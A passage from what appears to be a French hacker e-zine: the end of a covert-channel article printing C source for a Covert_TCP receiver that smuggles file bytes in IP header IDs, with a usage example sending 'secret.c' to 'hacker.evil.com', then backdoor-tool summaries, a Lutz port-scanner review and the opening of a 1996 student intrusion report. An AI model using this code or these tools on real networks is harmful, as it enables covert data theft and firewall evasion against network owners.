\n");<br>   246	      printf("at a time using the default IP ID packet encoding.\n");<br>   247	      exit(0);<br>   248	}<br></code></pre>
      Alors tout comme le code pr&eacute;c&eacute;dent nous iront &agrave; l'essentiel 
      et voir ce qui est diff&eacute;rent des codes pr&eacute;c&eacute;dents.<br>
      Tout d'abord remarquez que l'on forge un header TCP dans IP pour que le 
      paquet est vraiment l'air v&eacute;ridique.<br>
      Comparer au code sur le covert channel TCP:<br>
      ligne 131: contrairement &agrave; l'ancien code, Le champ Identification 
      de l'header IP est rempli avec nos donn&eacute;es.<br>
      ligne 143: Le champ N&deg; de S&eacute;quence de l'header TCP est bel et 
      bien rempli avec un nombre al&eacute;atoire.<br>
      Tout le reste du code est identique &agrave; celui sur les covert channel 
      TCP.<br> <br>
      C&ocirc;t&eacute; serveur (&ccedil;a se passe de commentaire).<br> <pre><code>server.h:<br>     1	#include &lt;stdio.h&gt;<br>     2	#include &lt;stdlib.h&gt;<br>     3	#include &lt;signal.h&gt;<br>     4	#include &lt;string.h&gt;<br>     5	#include &lt;unistd.h&gt;<br>     6	#include &lt;netdb.h&gt;<br>     7	#include &lt;netinet/in.h&gt;<br>     8	#include &lt;sys/socket.h&gt;<br>     9	#include &lt;arpa/inet.h&gt;<br>    10	#include &lt;linux/ip.h&gt;<br>    11	#include &lt;linux/tcp.h&gt;<br>       <br>    12	void forgepacket(unsigned int, unsigned int, unsigned short, unsigned short, char *,<br>    13						  int);<br>    14						  <br>    15	unsigned int host_convert(char *);<br>    16	void usage(char *);<br><br>server.c:<br>     1	/* Covert_TCP 1.0 - Covert channel file transfer for Linux<br>     2	* Written by Craig H. Rowland (crowland@psionic.com)<br>     3	* Copyright 1996 Craig H. Rowland (11-15-96)<br>     4	* NOT FOR COMMERCIAL USE WITHOUT PERMISSION. <br>     5	* <br>     6	*<br>     7	* This program manipulates the TCP/IP header to transfer a file one byte<br>     8	* at a time to a destination host. This progam can act as a server and a client<br>     9	* and can be used to conceal transmission of data inside the IP header. <br>    10	* This is useful for bypassing firewalls from the inside, and for <br>    11	* exporting data with innocuous looking packets that contain no data for <br>    12	* sniffers to analyze. In other words, spy stuff... :)<br>    13	*<br>    14	* PLEASE see the enclosed paper for more information!!<br>    15	*<br>    16	* This software should be used at your own risk. <br>    17	*<br>    18	* compile: cc -o covert_tcp covert_tcp.c<br>    19	*<br>    20	* <br>    21	* Portions of this code based on ping.c (c) 1987 Regents of the <br>    22	* University of California. (See function in_cksm() for details)<br>    23	*<br>    24	* Small portions from various packet utilities by unknown authors<br>    25	*/<br>       <br>    26	#include "server.h"<br>    27	int main(int argc, char *argv[]){<br>    28	   unsigned int source_host=0,dest_host=0;<br>    29	   unsigned short source_port=0,dest_port=80;<br>    30	   int ipid=0,file=0;<br>    31	   int count;<br>    32	   char desthost[80],srchost[80],filename[80];<br>    33	   if(geteuid() !=0)<br>    34	    {<br>    35	    printf("\nYou need to be root to run this.\n\n");<br>    36	    exit(0);<br>    37	    }<br>    38	   if((argc &lt; 5) || (argc &gt; 13))<br>    39	   {<br>    40	   usage(argv[0]);<br>    41	   exit(0);<br>    42	   }<br>    43	   for(count=0; count &lt; argc; ++count)<br>    44	    {<br>    45	    if (strcmp(argv[count],"-dest") == 0)<br>    46	     {<br>    47	     dest_host=host_convert(argv[count+1]); <br>    48	     strncpy(desthost,argv[count+1],79);<br>    49	     }<br>    50	     <br>    51	    else if (strcmp(argv[count],"-source") == 0)<br>    52	     {<br>    53	     source_host=host_convert(argv[count+1]); <br>    54	     strncpy(srchost,argv[count+1],79);<br>    55	     }<br>    56	    else if (strcmp(argv[count],"-file") == 0)<br>    57	     {<br>    58	     strncpy(filename,argv[count+1],79);<br>    59	     file=1;<br>    60	     }<br>    61	    else if (strcmp(argv[count],"-source_port") == 0)<br>    62	      source_port=atoi(argv[count+1]);<br>    63	    else if (strcmp(argv[count],"-dest_port") == 0)<br>    64	      dest_port=atoi(argv[count+1]);<br>    65	    }<br>    66	   /* check the encoding flags */<br>    67	    ipid=1; /* set default encode type if none given */<br>    68	  <br>    69	   if(file != 1)<br>    70	    {<br>    71	    printf("\n\nYou need to supply a filename (-file &lt;filename&gt;)\n\n");<br>    72	    exit(1);<br>    73	    }<br>    74	    <br>    75	    if (source_host == 0 &amp;&amp; source_port == 0)<br>    76	      {<br>    77	      printf("You need to supply a source address and/or source port for server mode.\n");<br>    78	      exit(1);<br>    79	      }<br>    80	     if(dest_host == 0) <br>    81	      strcpy(desthost,"Any Host");<br>    82	     if(source_host == 0)<br>    83	      strcpy(srchost,"Any Host");<br>    84	     printf("Listening for data from IP: %s\n",srchost);<br>    85	     <br>    86	     if(source_port == 0)<br>    87	      printf("Listening for data bound for local port: Any Port\n");<br>    88	     else<br>    89	      printf("Listening for data bound for local port: %u\n",source_port);<br>    90	     printf("Decoded Filename: %s\n",filename);<br>    91	      printf("Decoding Type Is: IP packet ID\n");<br>    92	     printf("\nServer Mode: Listening for data.\n\n");<br>    93	     forgepacket(source_host, dest_host, source_port, dest_port,filename,ipid);<br>    94		  exit(0);<br>    95	}<br>       <br>    96	void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned \<br>    97	short source_port, unsigned short dest_port, char *filename, int ipid ) {<br>    98	   struct recv_tcp<br>    99	   {<br>   100	      struct iphdr ip;<br>   101	      struct tcphdr tcp;<br>   102	      char buffer[10000];<br>   103	   } recv_pkt;<br>   104	   int recv_socket;<br>   105	   FILE *output;<br>   106	   <br>   107	   srand((getpid())*(dest_port)); <br>   108	   <br>   109	    if((output=fopen(filename,"wb"))== NULL)<br>   110	  {<br>   111	  printf("I cannot open the file %s for writing\n",filename);<br>   112	  exit(1);<br>   113	  }<br>   114	 while(1) <br>   115	 {<br>       <br>   116	   recv_socket = socket(AF_INET, SOCK_RAW, 6);<br>   117	   <br>   118	   if(recv_socket &lt; 0)<br>   119	   {<br>   120	      perror("receive socket cannot be open. Are you root?");<br>   121	      exit(1);<br>   122	   }<br>   123	  read(recv_socket, (struct recv_tcp *)&amp;recv_pkt, 9999);<br>   124	        if (source_port == 0) <br>   125	        {       <br>   126	                if((recv_pkt.tcp.syn == 1) &amp;&amp; (recv_pkt.ip.saddr == source_addr)) <br>   127	                {<br>   128	                       <br>   129	                        printf("Receiving Data: %c\n",recv_pkt.ip.id);<br>   130	                        fprintf(output,"%c",recv_pkt.ip.id);<br>   131	                        fflush(output);<br>   132	                } <br>   133	        } <br>   134	        else<br>   135	        {<br>   136	                if((recv_pkt.tcp.syn==1) &amp;&amp; (ntohs(recv_pkt.tcp.dest) == source_port)) <br>   137	                {<br>   138	                       printf("Receiving Data: %c\n",recv_pkt.ip.id);<br>   139	                       fprintf(output,"%c",recv_pkt.ip.id);<br>   140	                       fflush(output);<br>   141	                } <br>   142	        } <br>   143	   close(recv_socket); <br>   144	  }<br>   145	  fclose(output);<br>   146	}<br>       <br>   147	unsigned int host_convert(char *hostname)<br>   148	{<br>   149	   static struct in_addr i;<br>   150	   struct hostent *h;<br>   151	   i.s_addr = inet_addr(hostname);<br>   152	   if(i.s_addr == -1)<br>   153	   {<br>   154	      h = gethostbyname(hostname);<br>   155	      if(h == NULL)<br>   156	      {<br>   157	         fprintf(stderr, "cannot resolve %s\n", hostname);<br>   158	         exit(0);<br>   159	      }<br>   160	      bcopy(h-&gt;h_addr, (char *)&amp;i.s_addr, h-&gt;h_length);<br>   161	   }<br>   162	   return i.s_addr;<br>   163	} <br>       <br>   164	void usage(char *progname)<br>   165	{<br>   166	      printf("Covert TCP usage: \n%s -dest dest_ip -source source_ip -file \<br>   167	filename -source_port port -dest_port port\n\n", <br>   168	progname);<br>   169	      printf("-dest dest_ip      - Host to send data to.\n");<br>   170	      printf("-source source_ip  - Host data will be coming FROM.\n");<br>   171	      printf("-source_port port  - IP source port you want data to appear from. \n");<br>   172	      printf("                     (randomly set by default)\n");<br>   173	      printf("-dest_port port    - IP source port you want data to go to. In\n");<br>   174	      printf("                     SERVER mode this is the port data will be coming\n");<br>   175	      printf("                     inbound on. Port 80 by default.\n");<br>   176	      printf("-file filename     - Name of the file to encode and transfer.\n");<br>   177	      printf("\nPress ENTER for examples.");<br>   178	      getchar();<br>   179	      printf("\nExample: \nclient -dest foo.bar.com -source hacker.evil.com - \<br>   180	source_port 1234 -dest_port 80 -file secret.c\n\n");<br>   181	      printf("Above sends the file secret.c to the host hacker.evil.com a byte \n");<br>   182	      printf("at a time using the default IP packet ID encoding.\n");<br>   183	      exit(0);<br>   184	} <br>       <br></code></pre>
      [<a name="RFCIP"></a>RFC]<br> <a href="http://abcdrfc.free.fr/rfc-vf/rfc791.html">http://abcdrfc.free.fr/rfc-vf/rfc791.html</a><br> 
      <br>
      [<a name="FrameIpIP"></a>FrameIp] <br> <a href="http://www.frameip.com/enteteip/">http://www.frameip.com/enteteip/</a><br> 
      <p class="texttitre">Outils</p>
      Je vais vous parlez, dans cette section, des diff&eacute;rents outils de 
      covert channel que je connais, de leurs avantages et de leurs d&eacute;fauts, 
      beaucoup des descriptions de ces outils sont tir&eacute;es de l'excellent 
      article [<a href="#CovertShell">Covert Shell</a>] par J. Christian Smith. 
      Les outils seront pr&eacute;sent&eacute;s en fonction de leurs anciennet&eacute; 
      (du plus ancien au plus contemporain).<br> <br>
      - Loki: Cet outil, pr&eacute;sent&eacute; dans phrack 49 par Alhambra et 
      daemon9, utilise le corps des messages ICMP echo request/reply pour mettre 
      en place une communication bidirectionnelle. Normalement le corps de ces 
      messages ICMP est utilis&eacute; pour la v&eacute;rification de l'int&eacute;grit&eacute; 
      des paquets ou encore des informations de temps. Ceci concerne la premi&egrave;re 
      version de Loki. Il y a eut une deuxi&egrave;me version, pr&eacute;sent&eacute;e 
      dans phrack 51, o&ugrave; l'id&eacute;e f&ucirc;t prolong&eacute;e pour 
      &ecirc;tre mise en place dans des paquets UDP camoufl&eacute;s sous forme 
      de requ&ecirc;te DNS. La possibilit&eacute; de changer de protocole au-vol 
      a &eacute;galement &eacute;t&eacute; impl&eacute;ment&eacute;. Une encryption 
      blowfish et l'&eacute;change de cl&eacute; sym&eacute;trique/asym&eacute;trique 
      f&ucirc;rent &eacute;galement impl&eacute;ment&eacute;s.<br> <br>
      - Daemonshell-UDP: Pr&eacute;senter par THC's van Hauser, cet outil utilise 
      les corps des messages TCP et UDP. L'utilisation du corps de ces protocoles 
      ne n&eacute;cessitent pas les droits root, ce qui peut &ecirc;tre un avantage. 
      De plus, ce programme tente de se faire passer pour l'utilitaire vi.<br> 
      <br>
      - ICMP backdoor: R&eacute;aliser par la team CodeZero, cet outil utilise 
      le corps des messages ICMP echo reply. Cet outil, contrairement &agrave; 
      Loki, n'est pas int&eacute;ractif. Par contre, le fait que ce programme 
      n'utilise pas le padding (remplissage) du paquet ICMP peut pr&ecirc;ter 
      &agrave; confusion et le faire passer pour un simple paquet IP inconnus 
      vu sa taille r&eacute;duite.<br> <br>
      - Rwwwshell: Une autre cr&eacute;ation de la team THC's van Hauser consistant 
      en un covert channel dans le protocole HTTP avec une connection renvers&eacute;e, 
      le client est placer sur la cible et se connecte au serveur. Ceci permet 
      d'&eacute;viter beaucoup de filtres firewall/proxy. Le fonctionnement de 
      cet utilitaire est simple.<br>
      Tout d'abord le client, &agrave; interval r&eacute;gulier, se connecte au 
      serveur (placer sur une autre machine sous le contr&ocirc;le du hacker) 
      puis le serveur r&eacute;pond en envoyant les commandes shell au client 
      et enfin le client renvoie la sortie produite par la commande shell au serveur. 
      Les donn&eacute;es sont uuencod&eacute;e pour passer inaper&ccedil;ues. 
      Le probl&egrave;me de cet outil est qu'il appel un script cgi ce qui est 
      tr&egrave;s visible dans les logs du traffic HTTP.<br> <br>
      - B0CK: R&eacute;aliser par la team s0ftpr0ject, cet outil utilise les messages 
      IGMP multicast pour cach&eacute; ses donn&eacute;es. La grande innovation 
      de ce programme est qu'il utilise l'adresse IP source pour cacher les donn&eacute;es 
      : la table ASCII va au maximum jusqu'&agrave; 255 tout comme une adresse 
      IPv4 ce qui nous permet de cacher au minimum 4 caract&egrave;res dans une 
      ip. Pour chaque envoie de donn&eacute;e l'adress IP source change donc ce 
      qui est tout &agrave; fait cr&eacute;dible. Mais l'IP spoofing est une technique 
      qui fonctionne de moins en moins.<br> <br>
      - CCTT: Une r&eacute;alisation de la team Gray-World. Cet utilitaire permet 
      de faire du tunneling et du covert channel &agrave; haut niveau (SOCK_STREAM 
      et SOCK_DGRAM). Il s'agit d'un utilitaire "touche &agrave; tout" capable 
      de mettre en place des shell, reverse shell... Pour plus d'informations 
      allez donc sur le site [<a href="#CCTT">CCTT</a>]<br> <br>
      - MsnShell: Un outil tr&egrave;s int&eacute;ressant utilisant un protocole 
      de tr&egrave;s haut niveau, MSN. Cr&eacute;&eacute; par Wei Zheng, cet utilitaire 
      s'occupe de mettre en place un shell, lorsqu'une personne s'y connectes, 
      via un client MSN (MSN Messenger par exemple) et tapes des commandes Linux. 
      Le principe est tr&egrave;s int&eacute;ressant sachant que souvent dans 
      le r&eacute;seau d'une entreprise, les connections de l'int&eacute;rieur 
      vers l'ext&eacute;rieur sont interdites sauf pour certains protocoles/ports. 
      Allez donc voir sur la page de [<a href="#MsnShell">MsnShell</a>] pour plus 
      d'informations.<br> <br>
      On peut aussi utilis&eacute; des outils forgeant des paquets comme Hping, 
      Scapy, Rafale X etc...<br> <br>
      [<a name="CovertShell"></a>CovertShell]<br> <a href="http://ouah.kernsh.org/covert_shells.htm">http://ouah.kernsh.org/covert_shells.htm</a><br> 
      <br>
      [<a name="CCTT"></a>CCTT]<br> <a href="http://entreelibre.com/cctt/">http://entreelibre.com/cctt/</a><br> 
      <br>
      [<a name="MsnShell"></a>MsnShell]<br> <a href="http://wei-zheng.3322.org/msnshell/">http://wei-zheng.3322.org/msnshell/</a><br> 
      <p class="texttitre">Conclusion</p>
      <p>Les covert channel sont connus par les hackers depuis un moment d&eacute;j&agrave; 
        : le premier programme rendu publique utilisant un covert channel &eacute;tait 
        Loki sorti en 1996. Mais ces techniques datent de bien avant la sortie 
        de cet outil. Et pourtant, ce th&egrave;me reste toujours d'actualit&eacute; 
        et le restera surement pendant un bon moment, &agrave; l'inverse il &eacute;voluera 
        de plus en plus, sachant que de plus en plus de protocoles de tr&egrave;s 
        haut niveau (au dessus de HTTP, IRC...) se d&eacute;veloppent.<br>
        J'esp&egrave;re vous avoir &eacute;clairer avec cet article sur les covert 
        channel. Ne connaissant aucun autre article en fran&ccedil;ais sur le 
        sujet je me suis dit "pourquoi pas" :).<br>
        [NPN: pour compiler les code source fournis dans cet article:<br>
        gcc -o client client.c<br>
        il est impossible de mettre nos donn&eacute;es n'importe o&ugrave; dans 
        le header des paquets sinon ceux-ci risquent&nbsp;de ne pas respecter 
        la RFC et donc de ne pas &ecirc;tre transmis.]<br>
        <br>
        Remerciements: zul et x-faktor qui m'ont bien aider (des fois sans m&ecirc;me 
        s'en rendre compte :)).<br>
        Un petit coucou &agrave; tous les gens que j'ai croiser depuis que je 
        m'int&eacute;resse au hack/s&eacute;curit&eacute; : Subfr.org, Securi-Corp, 
        CNC (lol), Degenere-Science.<br>
        <br>
        <a target="_blank" href="http://flyers.next-touch.com">Flyers</a>.<br>
        "Tu imagines si tu &eacute;tais le roi du monde tout en vivant dans les 
        d&eacute;chets ? Ce serait une fa&ccedil;on de m&eacute;priser la soci&eacute;t&eacute; 
        qui te rej&egrave;tes mais que tu commandes."&nbsp; Kes </p></td>
  </tr>
  <tr> 
    <td height="21" valign="top" class="textgras" bgcolor="#000000"><a name="lutz"></a>Toolz 
      Armory --Lutz v0.4b--</td>
  </tr>
  <tr> 
    <td valign="top"> <pre>
URL          : http://sourceforge.net/projects/lutz/
Author       : Christian Eichelmann (Killswitch)
               <killswitch [ at ] join-neo dot ]de>
Commentaires : sirius_black

  Il y a quelques temps j'etais sous SuSE Linux 9.0. Apres avoir installe
nmap il s'est avere que celui ne fonctionnait pas sur ce systeme. Cela m'a
amene a chercher une alternative a nmap. Apres quelques recherches je suis
tombe sur Lutz qui, au vue de ses fonctionnalites semblait etre la
meilleure alternative a Nmap.

  Lutz a ete developpe par un Allemand durant son temps libre. Comprenez
par la que Lutz n'a pas l'ambition de devenir le concurrent de Nmap mais
il offre des resultats non negligeables.
  A note que contrairement a Nmap, Lutz n'utilise pas la libpcap mais
est code de facon a n'utiliser que les raw-sockets.

  La version teste pour cet article est la v0.4b. Vous trouverez assez
facilement de la documentation en Anglais sur ce logiciel.

  Lutz sur le papier :

sirius@lotfree:~> lutz -h
Starting lutz V0.4b ( http://sourceforge.net/projects/lutz/ )
Report bugs to Killswitch ( shinnok@sourceforge.net )
usage : lutz <host> [Options]

  -sC Connect() Scan. Default for nonroot users
* -sS SYN-Stealth Scan. Default for r00t
* -sF,-sX,-sN FIN,Xmas,NULL-Scan instead of SYN-Scan
* -F <fakehosts> Uses commaseperated Fakehosts for Scanning
  -p <range> port(s) to scan (Example:1-6000,31337 )
  -iR Scanns Random IP Addresses until STRG-C is caught
  -iL <file> Reads Hostlist from <file> (one host per line)
  -P Dont Ping the Host
  -T <msec> Specifies the Timeout in msecs (lutz tries to get the right value)
* -S <ip> Specifies the Source address (lutz tries to get the right address)
* -g <port> Set the Sourceport for Scanning
  -oN, oG, oK <file> Logs Scan in normal, grepable and kiddi format
  -h Shows this screen and exit
  -f Fastscan ( only scan ports in /etc/services )
  -r Randomizes the Portlist
  -O Starts an OS Scan
  -v Verbouse output ( maybe interesting ? )
  -vv VERY verbouse output ( for debugging )
  -V Shows the Version Number and exit

  ( * means you need to be r00t to use this option )

  Commencons par les points communs / differences avec Nmap. Pour ce qui
est des ressemblances elles sont assez frapantes. Tout d'abord Lutz
implemente les methodes de scan dites furtives comme le SYN-Scan, FIN, NULL
ou encore le Xmas-Scan (options -sS, -sF, -sN et -sX.)
  Lutz propose aussi la methode de scan universelle qui consiste a etablir
une connexion complete (-sC). Il s'agit de la methode par defaut si vous
lancez Lutz sans avoir les droits root (sinon le SYN-Scan est utilise par
defaut.)
  La methode DECOY de Nmap est ici implementee par l'option -F qui permet
de dissimuler son adresse IP au milieu d'un tas d'adresses.
  Lutz permet, a l'instar de Nmap, de specifier une adresse source. Bien
sur n'utilisez cette option que si vous avez la possibiliter de sniffer
les reponses (sur un reseau local par exemple.)
  Lutz possede d'autres points communs a Nmap que vous avez du remarque
dans l'ecran d'aide du logiciel.

  Passons aux differences. Parmis les options que Lutz n'offre pas se trouve
l'UDP Scanning ainsi que l'affichage des versions des services scannes.
Cela est evidemment du au fait que Lutz n'utilise pas la libpcap. Il serait
bien trop difficile de decrypter tous les protocoles en se basant uniquement
sur les raw sockets.
  Lutz ne permet pas non plus de faire un RPC-scan.

  Nmap montre lui aussi des lacunes par rapport a Lutz. Premierement la
possibilite de scanner des IPs aleatoires. Certes on peut se demander a
premiere vue a quoi cela peut servir. En fait cette option permet de
remplacer certains logiciels de scans specifiques et par exemple de
chercher des machines avec SMTP (pour le spam), avec FTP (warez) etc.
Bref on peut y trouver bon nombre d'utilisations si on couple cette option
avec d'autres options.
  Petit detail amusant, Lutz permet tout comme Nmap de formatter les
resultats de plusieurs facons sauf qu'a la place du format XML de Nmap, Lutz
propose un f0rm4t p0uR 13s C0wB0y5 :p
  Lutz permet de choisir le port source des scans. Cela est utilise si vous
souhaitez scanner une machine derriere un firewall qui ne laisse passer que
les transactions DNS par exemple. Il me semble que Nmap le permet aussi mais
je n'ai pas la preuve sous les yeux.

  Lutz possede des fonctionnalites cachees dans le sens ou elles n'apparai-
ssent pas dans l'ecran d'aide. Ces options sont pourtant decrites dans la
documentation.
  La premiere de ces fonctionnalites est l'IDLE-Scan, deja implemente par
Nmap. Pour l'utiliser on utilise l'option -sI <zombie>. L'auteur precise
qu son implementation est encore en version Beta et qu'il ne faux pas trop
se fier aux resultats.
  La seconde fonctionnalite cache est bien plus fiable. il s'agit de
l'option -sP. Contrairement a Nmap il ne s'agit pas d'un Ping-Scan mais d'un
"PROTO-Scan". Voici un exemple :

linux:~ # lutz -sP -vv 192.168.0.2

Starting lutz V0.4b ( http://sourceforge.net/projects/lutz/ )
Report bugs to Killswitch ( shinnok@sourceforge.net )
Scanning Protocols on unknown [192.168.0.2]
Guessed Source Address is 192.168.0.1
Setting Timeout to 1350 ms

Initialing PROTO Scan against 192.168.0.2 on Fri Aug 20 16:40:21 2004

Proto    Name          State       Description
1        icmp          open        Internet Control Message
2        igmp          open        Internet Group Management
6        tcp           open        Transmission Control
17       udp           open        User Datagram

Scanned 255 protocols with PROTO Scan in 4 seconds.
4 are in state open

Scanned 1 Hosts in 4 seconds -  1 hosts up

  cette option permet comme vous avez du le deviner de decouvrir quels
protocoles sont supportes par la machine scannee (ci dessus un win98)

Essayons sur ma machine (linux 2.4.21-144-default, SuSE 9.0)

Initialing PROTO Scan against 192.168.0.1 on Fri Aug 20 16:42:02 2004

Proto    Name          State       Description
1        icmp          open        Internet Control Message
2        igmp          open        Internet Group Management
6        tcp           open        Transmission Control
17       udp           open        User Datagram
41       ipv6          open        Ipv6

Scanned 255 protocols with PROTO Scan in 5 seconds.
5 are in state open

  Ma machine supporte l'IPv6 :)

  Petite partie technique... Je remercie KillSwitch (l'auteur de Lutz) pour
m'avoir donne son aide ;)
  Comment marche le PROTO-Scan ? Et bien en fait c'est assez simple. Il
suffit d'envoyer a la machine des paquets qui s'arretent a l'entete IP.
Cet entete IP possede un champ "Protocol" qui permet a la machine receptrice
de savoir quel entete de protocole se trouve apres. Seulement il n'y a rien
apres !!
  La machine qui recoit ces paquets malformes va reagir differemment selon
quelle gere ou non le protocole definit dans l'entete IP.

  Premier cas : la machine ne gere pas le protocole.
Dans ce cas la elle repond par un message ICMP de type 3 (Destination
unreachable) - Code 2 (Protocol unreachable) avec comme message l'entete IP
qui lui a pose probleme (on peut donc retrouver le protocole quelle ne gere
pas.)

  Second cas : la machine supporte le protocole.
Dans ce second cas elle ne renvoie tout simplement aucune reponse.

  La fonction PROTO-Scan de Lutz consiste tout simplement a envoyer des
paquets malformes en incrementant a chaque fois le champ "protocol" de
l'entete IP (de 0 a 255.)

  Changons de sujet : l'OS-Fingerprinting
  Lutz se base sur un systeme de signatures tres proche de Nmap... avec
quelques tests en moins.

(...)
Starting OS Scan.
Assuming that Port 1 is closed and Port 139 is open, an neither are firewalled
Cant get Uptime of 192.168.0.2. No Timestamp returned
IPID Sequence Generation : Random Positive Increment

OS Fingerprint : 
T1(Resp=Y%DF=Y%W=2017%ACK=S++%Flags=AS%Ops=M)
T2(Resp=Y%DF=N%W=0%ACK=S%Flags=AR%Ops=)
T3(Resp=Y%DF=Y%W=2017%ACK=S++%Flags=AS%Ops=M)
T4(Resp=Y%DF=N%W=0%ACK=O%Flags=R%Ops=)
T5(Resp=Y%DF=N%W=0%ACK=S++%Flags=AR%Ops=)
T6(Resp=Y%DF=N%W=0%ACK=O%Flags=R%Ops=)
T7(Resp=Y%DF=N%W=0%ACK=S++%Flags=AR%Ops=)

Best remote OS guess ( 100.0% ) : Turtle Beach AudioTron Firmware 3.0
Scanned 1 Hosts in 0 seconds -  1 hosts up

  Bon ici ca n'a pas marche (il aurait du dire Windows 98) mais sur mon
linux ca a tres bien marche.

  Alors Lutz est vraiment fiable ?
J'avoue avoir eu quelques surprises avec ce logiciel. La plupart de mes
scans on ete fait avec la commande suivante :
lutz -sS -f -vv 192.168.0.2

  En lancant 3 fois de suite la meme commande, j'obtenais 3 resultats...
differents :(
  De toute evidence cela etait du au TimeOut qui est choisi au hazard par
Lutz (et que l'on peut voir avec l'option -vv.)

Note : L'option -T ne permet pas de specifier une duree d'atente entre les
scans mais fixe le temps d'attente d'une reponse a un scan.

  Pour obtenir des resultats fiables j'ai du a chaque fois rajouter les
instructions "-T 900" qui permettent de fixer un grand TimeOut.

  Lutz furtif ? D'un certain point de vue Lutz est furtif car il utilise
des techniques de scan avancees. Toutefois il ne fait pas le poids en face
de nmap. Tout d'abord Lutz scanne les ports par ordre croissant par defaut.
Heureusement l'option -r permet de les scanner dans un ordre aleatoire.
N'oubliez pas d'utiliser cette option (avec un -T 900 bien sur.)

  Ensuite si on sniffe le traffic genere par Lutz on s'appercoit de
plusieurs chose :
- le TTL est fixe a 56 pour tous les scans (sur les dernieres version de
nmap il change tout le temps)
- Le numero de sequence TCP vaut toujours 0 alors que pour nmap il change
pour chaque session de scan.
- La taille de la fenetre (window size) est fixe a 0. Sous nmap cette
valeur change tout le temps.

  Conclusion
  Lutz ne rivalise certes pas avec Nmap mais comme je l'ai dit au debut il
n'en a pas les pretentions. Il propose un certains nombre de fonctions
attrayantes qui font de lui une alternative tres interessante au scanneur de
Fyodor.
  Bref si vous desirez changer d'air ou simplement avoir un complement a
Nmap alors Lutz est fait pour vous ;)</pre></td>
  </tr>
  <tr> 
    <td height="21" valign="top" class="textgras" bgcolor="#000000"><a name="black2">S&eacute;curit&eacute; R&eacute;seau Avanc&eacute;e</a></td>
  </tr>
  <tr> 
    <td valign="top" class="textpetit"><p class="textpetit">&nbsp;Note pour la traduction : C'est vrai que ce document
date de 8 ans ^_^ mais le principe de cette simulation de piratage
est int&eacute;ressant. De plus ce rapport nous montre l'&eacute;tat
de la s&eacute;curit&eacute; informatique &agrave; l'&eacute;poque
(quasi inexistante) et donc on se rend mieux compte de l'&eacute;volution
qui a &eacute;t&eacute; faite depuis dans ce domaine.
<BR><BR>
<P ALIGN=LEFT>sirius@lotfree:~&gt;
fortune limerick<BR>There once was a young girl from Natches<BR>Who
chanced to be born with two snatches<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;She
often said, &quot;Shit!<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;I'd
give either tit<BR>For a guy with equipment that matches.&quot;</P>
<P ALIGN=LEFT>Bonne lecture ;)</P>
<P ALIGN=CENTER><FONT SIZE=4><B>Compte Rendu Final</B></FONT></P>
<P ALIGN=CENTER><FONT SIZE=4><B>S&eacute;curit&eacute; R&eacute;seau
Avanc&eacute;e</B></FONT></P>
<P ALIGN=CENTER><B>CPSC689 - &Eacute;t&eacute;
96</B></P>
<P ALIGN=CENTER>Instructeur
: Dr. Udo. W. Pooch</P>
<P ALIGN=CENTER>R&eacute;dig&eacute;
par</P>
<P ALIGN=CENTER><B>L'&eacute;quipe
Black2</B></P>
<P ALIGN=CENTER>Ajay Kumar Gummmadi</P>
<P ALIGN=CENTER>Eric Daniel</P>
<P ALIGN=CENTER>Faisal Karim</P>
<P ALIGN=CENTER>Ikram Ahmed Khan</P>
<P ALIGN=CENTER>Ralph Akram Gholmieh</P>
<P ALIGN=CENTER>Raul Gonzalez Barron</P>
<P ALIGN=CENTER>Rehan Ayyub Sheikh</P>
<HR>

<A NAME="sommaire"></A>
<P ALIGN=LEFT>A. <A HREF="#sommaire">Sommaire</A></P>
<P ALIGN=LEFT>B. <A HREF="#resume">R&eacute;sum&eacute;</A></P>
<P ALIGN=LEFT>C. <A HREF="#intro">Introduction</A></P>
<P ALIGN=LEFT>D. <A HREF="#d">Techniques de Hacking</A><BR>D.1.
<A HREF="#d1">Social Engineering (eavsdropping)</A><BR>D.2. <A HREF="#d2">Les
vieux Bugs en grand partie patch&eacute;s</A><BR>D.3. <A HREF="#d3">Mauvaise
configuration de la table de montage</A><BR>D.4. <A HREF="#d4">CERT
advisory CA-96.10</A><BR>D.5. <A HREF="#d5">Cassage des mots de
passe</A><BR>D.6. <A HREF="#d6">Le syndrome r&eacute;curent des
fichiers temporaires, les exploits Kcms/Admintool</A><BR>&nbsp;&nbsp;&nbsp;D.6.1
<A HREF="#d61">Description</A><BR>&nbsp;&nbsp;&nbsp;D.6.2 <A HREF="#d62">La
vuln&eacute;rabilit&eacute; KCMS</A><BR>&nbsp;&nbsp;&nbsp;D.6.3 <A HREF="#d63">La
vuln&eacute;rabilit&eacute; Admintool</A><BR>&nbsp;&nbsp;&nbsp;D.6.4
<A HREF="#d64">Conclusion</A><BR>D.7. <A HREF="#d7">Envoyer de faux
paquets et scanner les ports UDP, le premier essai de &laquo;&nbsp;d&eacute;ni
de service&nbsp;&raquo;</A><BR>D.8. <A HREF="#d8">Le protocole ICMP,
le programme nuke</A><BR>D.9. <A HREF="#d9">Effacer nos traces</A><BR><BR>E.
<A HREF="#e">Exploitation de nos Outils de Hacking, leurs Attaques et
leurs R&eacute;sultats</A><BR>E.1. <A HREF="#e1">Exploitation des
r&eacute;pertoire Home partag&eacute;s</A><BR>E.2. <A HREF="#e2">Acc&egrave;s
root sur Gold1 et Gold2 gr&acirc;ce &agrave; l'exploit NIS</A><BR>E.3.
<A HREF="#e3">Exploitation de la vuln&eacute;rabilit&eacute;
Kcms</A><BR>E.4. <A HREF="#e4">Forcer le syst&egrave;me &agrave;
red&eacute;marrer en utilisant le programme nuke</A><BR>E.5. <A HREF="#e5">Le
combat avec l'&eacute;quipe Black4</A><BR><BR>F. <A HREF="#f">Outils
de Scanning</A><BR>F.1. <A HREF="#f1">COPS</A><BR>F.2. <A HREF="#f2">SATAN</A><BR><BR>G.
<A HREF="#g">Conclusion</A><BR><BR>H. <A HREF="#h">Suggestions pour
la prochaine version du cours</A><BR><BR>I. <A HREF="#i">Annexes</A><BR>I.1.
<A HREF="#i1">Scripts &amp; Philez</A><BR>I.2. <A HREF="#i2">R&eacute;f&eacute;rences</A></P>
<HR>
<OL TYPE=A START=2>
	<LI><P ALIGN=LEFT><A NAME="resume"></A><p class="texttitre"><B>R&eacute;sum&eacute;</B></p></P>
</OL>
<P ALIGN=LEFT>'S&eacute;curit&eacute; R&eacute;seau Avanc&eacute;e'
est un th&egrave;me de cours sp&eacute;cial dispens&eacute; au
